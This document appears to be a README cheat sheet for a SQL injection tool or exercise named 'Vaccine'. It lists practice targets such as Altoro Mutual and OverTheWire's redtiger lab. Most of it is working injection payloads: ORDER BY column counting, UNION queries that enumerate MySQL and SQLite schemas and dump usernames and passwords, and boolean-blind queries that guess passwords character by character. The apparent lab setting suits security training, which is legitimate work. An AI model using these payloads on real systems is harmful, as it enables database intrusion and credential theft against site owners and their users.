# Vaccine

# Usage

```
export TOKEN=YOUR_COOKIE
```

# Websites

- https://altoromutual.com/login.jsp

- https://redtiger.labs.overthewire.org/

## ERROR
- Use `ORDER BY` to check numbers of colums
```
' ORDER BY 1--
' ORDER BY 2--
...
```

## UNION

### MySQL
- https://portswigger.net/web-security/sql-injection/union-attacks

- Get database name
```
' UNION SELECT null, DATABASE() #
```
- Get table_names
```
' UNION SELECT null, table_name FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa' #
```
- Get column_names
```
' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name = 'users'#
```

### SQLite

- Get table_names
```
' union select null, null, tbl_name from sqlite_master--
```
- Get column_names
```
' union select null, null, sql from sqlite_master where name="users"--
```


- working other query examples
```
' union select null, username, password from users --
```


## Boolean

```
' or 1=2--
```

```
' or (select count(*) from app.accounts where substr(password, 1, 1)='a') >0--
